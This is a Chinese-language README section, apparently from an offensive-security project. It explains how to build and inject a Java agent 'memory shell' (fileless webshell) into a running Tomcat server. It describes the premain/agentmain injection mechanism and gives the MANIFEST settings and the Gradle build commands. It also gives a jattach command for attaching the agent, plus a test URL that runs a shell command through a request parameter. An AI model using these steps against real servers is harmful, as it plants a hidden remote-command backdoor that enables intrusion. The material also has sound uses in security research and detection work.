## Agent 内存马

### 实现原理

JDK1.5 提供了 JVMTI 接口供开发者扩展以查看 JVM 状态，或控制 JVM 代码执行。其中最重要的就是 `java.lang.instrument`，可以添加自定义的
Transformer，来进行字节码修改。具体细节可查看 [JVM 源码分析之 javaagent 原理完全解读](https://www.infoq.cn/article/javaagent-illustrated)。

JavaAgent 有两种入口：

1. 静态注入，MANIFEST 定义 Premain-Class 属性指定实现类，并且类中实现了
   `public static void premain(String args, Instrumentation inst)` 方法，在 Java 程序运行参数中添加
   `java -javaanget:/path/to/agent.jar -jar app.jar`，应用启动时，就会调用到 `premain` 方法执行字节码增强相关代码逻辑。
2. 动态注入，MANIFEST 定义 Agent-Class 属性指定实现类，并且类中实现了
   `public static void agentmain(String args, Instrumentation inst)` 方法，在 Java 程序运行过程中，通过 attach 机制进行
   attach 时，会调用到 `agentmain` 方法执行字节码增强相关代码逻辑。

当一个 jar 包中 MANIFEST 定义如下时：

```text
Premain-Class: com.reajason.javaweb.memshell.agent.CommandFilterChainTransformer
Agent-Class: com.reajason.javaweb.memshell.agent.CommandFilterChainTransformer
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Can-Set-Native-Method-Prefix: true
```

那么这个 Java Agent 既支持静态注入，也支持动态注入。

### 实现方式

> 目前提供了 Tomcat 最简单的命令回显 Agent 内存马实现方式

1. 基于
   ASM，[CommandFilterChainTransformer.java](memshell-agent-asm/src/main/java/com/reajason/javaweb/memshell/agent/CommandFilterChainTransformer.java)
2. 基于
   Javassist，[CommandFilterChainTransformer.java](memshell-agent-javassist/src/main/java/com/reajason/javaweb/memshell/agent/CommandFilterChainTransformer.java)
3. 基于
   ByteBuddy，[CommandFilterChainTransformer.java](memshell-agent-bytebuddy/src/main/java/com/reajason/javaweb/memshell/agent/CommandFilterChainTransformer.java)

### 如何使用

可以直接 IDEA 中的 Gradle，里面双击 memshell-agent 下的 Tasks 中 build 下的 jar 进行构建。

```bash
## 进入项目根目录
cd MemShellParty

## MacOs or Linux
./gradlew :memshell-agent:jar

## Windows
gradlew.bat :memshell-agent:jar
```

构建结束，会在每个模块 build/libs/ 下生成 Jar 包，其中带 all 的为我们所需要用的包，例如：

- memshell-agent-asm/build/libs/memshell-agent-asm-1.0.0-all.jar
- memshell-agent-javassist/build/libs/memshell-agent-javassist-1.0.0-all.jar
- memshell-agent-bytebuddy/build/libs/memshell-agent-bytebuddy-1.0.0-all.jar

下载 [jattach](https://github.com/jattach/jattach/releases/latest) 攻击实施动态注入。

1. 启动你需要注入的 Tomcat
2. 执行命令 `/path/to/jattach pid load instrument false /path/to/agent.jar`，注意，所有路径都使用绝对路径，不要使用相对路径
3. 访问 `http://localhost:8080/app/?paramName=id` ，查看是否成功